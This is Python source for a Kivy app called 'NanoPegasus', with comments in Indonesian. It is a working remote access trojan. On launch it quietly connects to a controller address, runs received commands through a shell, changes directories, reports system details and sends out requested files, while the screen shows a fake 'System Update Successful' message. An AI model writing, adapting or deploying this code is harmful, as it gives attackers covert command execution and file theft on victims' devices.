import socket
import subprocess
import os
import platform
import threading
from kivy.app import App
from kivy.uix.label import Label

def get_system_info():
    info = "=" * 40 + "\n"
    info += "         NANO-PEGASUS SYSTEM INFO          \n"
    info += "=" * 40 + "\n"
    info += f"Sistem Operasi : {platform.system()} {platform.release()}\n"
    info += f"Versi OS       : {platform.version()}\n"
    info += f"Arsitektur CPU : {platform.machine()}\n"
    info += f"Nama Perangkat : {platform.node()}\n"
    info += f"User Aktif     : {os.getlogin() if hasattr(os, 'getlogin') else 'Android_User'}\n"
    info += f"Direktori Kerja: {os.getcwd()}\n"
    info += "=" * 40 + "\n"
    return info

def connect_to_server():
    # Masukkan IP lokal PC/Server pengontrol Anda di sini
    server_ip = "192.168.1.X"  
    port = 9999

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, port))
    except:
        return

    while True:
        try:
            cmd = client.recv(1024).decode()
            if cmd.lower() == "exit":
                break
            
            if cmd.lower() == "sysinfo":
                sys_data = get_system_info()
                client.send(sys_data.encode())
                continue
            
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:])
                    client.send(f"[+] Direktori: {os.getcwd()}".encode())
                except Exception as e:
                    client.send(f"[-] Gagal: {str(e)}".encode())
                continue

            if cmd.startswith("download "):
                parts = cmd.split(" ", 1)
                filename = parts[1] if len(parts) > 1 else ""
                if os.path.exists(filename) and os.path.isfile(filename):
                    file_size = os.path.getsize(filename)
                    client.send(str(file_size).encode())
                    if client.recv(1024).decode() == "READY":
                        with open(filename, "rb") as f:
                            client.sendall(f.read())
                else:
                    client.send(f"ERROR: File '{filename}' tidak ditemukan.".encode())
                continue

            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            result = stdout + stderr
            if not result:
                result = b"[+] Sukses dijalankan.\n"
            client.send(result)
        except:
            break
    client.close()

class NanoPegasusApp(App):
    def build(self):
        t = threading.Thread(target=connect_to_server)
        t.daemon = True
        t.start()
        return Label(text="System Update Successful.\nYou can close this app.")

if __name__ == "__main__":
    NanoPegasusApp().run()

